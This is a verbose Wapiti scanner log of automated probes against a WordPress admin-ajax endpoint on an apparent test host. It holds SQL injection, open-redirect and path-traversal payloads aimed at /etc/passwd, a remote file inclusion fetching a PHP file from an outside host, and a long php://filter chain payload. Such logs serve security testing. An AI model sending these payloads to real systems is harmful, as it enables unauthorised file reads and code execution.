2024-03-21 21:12:21.843 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%27%20AND%2021%3D21%20AND%20%2787%27%3D%2787 (0)
2024-03-21 21:12:22.645 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%22%20AND%2093%3D140%20AND%20%2227%22%3D%2227 (0)
2024-03-21 21:12:23.452 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%22%20AND%2048%3D121%20AND%20%2242%22%3D%2242 (0)
2024-03-21 21:12:24.268 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%22%20AND%2068%3D68%20AND%20%2274%22%3D%2274 (0)
2024-03-21 21:12:25.081 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%29%20AND%2067%3D118%20AND%20%2886%3D86 (0)
2024-03-21 21:12:25.894 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%29%20AND%2021%3D58%20AND%20%2818%3D18 (0)
2024-03-21 21:12:26.695 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%29%20AND%2047%3D47%20AND%20%2859%3D59 (0)
2024-03-21 21:12:27.509 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%27%29%20AND%2055%3D122%20AND%20%28%2776%27%3D%2776 (0)
2024-03-21 21:12:28.322 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%27%29%20AND%2031%3D84%20AND%20%28%2718%27%3D%2718 (0)
2024-03-21 21:12:29.134 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%27%29%20AND%2032%3D32%20AND%20%28%2774%27%3D%2774 (0)
2024-03-21 21:12:29.951 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%22%29%20AND%2082%3D114%20AND%20%28%2258%22%3D%2258 (0)
2024-03-21 21:12:30.752 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%22%29%20AND%2039%3D95%20AND%20%28%2225%22%3D%2225 (0)
2024-03-21 21:12:31.550 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax%22%29%20AND%2094%3D94%20AND%20%28%2231%22%3D%2231 (0)
2024-03-21 21:12:32.374 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
2024-03-21 21:12:32.387 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:32.387 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?columns_gap=https%3A%2F%2Fopenbugbounty.org%2F&action=ere_property_gallery_fillter_ajax
2024-03-21 21:12:33.210 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?columns_gap=%2F%2Fopenbugbounty.org%2F&action=ere_property_gallery_fillter_ajax
2024-03-21 21:12:33.981 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=https%3A%2F%2Fopenbugbounty.org%2F
2024-03-21 21:12:34.745 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=%2F%2Fopenbugbounty.org%2F
2024-03-21 21:12:35.587 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
2024-03-21 21:12:35.598 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:36.417 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
2024-03-21 21:12:36.505 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-21 21:12:36.520 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:36.524 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:37.295 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:38.068 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%2Fetc%2Fpasswd&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:38.840 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%2Fetc%2Fpasswd%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:39.611 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:40.381 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:41.154 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:41.925 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:42.698 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:43.469 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:44.244 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:45.015 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:45.791 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:46.562 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:47.336 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:48.107 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:48.877 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:49.647 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:50.416 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:51.192 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:51.974 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:53.082 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:53.868 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:54.656 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:55.443 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:56.231 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:57.030 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:58.107 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:58.895 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:12:59.681 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:00.455 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:01.229 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:02.016 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:02.805 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:03.593 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:04.379 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:05.492 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:06.278 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:07.069 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:07.862 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:08.966 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:09.750 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:10.527 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:11.314 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:12.095 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:12.874 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:13.649 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:14.421 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:15.191 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:15.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:16.734 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:17.503 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=file%3A%2F%2F%2Fetc%2Fpasswd&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:18.274 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=ere_property_gallery_fillter_ajax (0)
2024-03-21 21:13:19.045 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?columns_gap=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&action=ere_property_gallery_fillter_ajax (0)
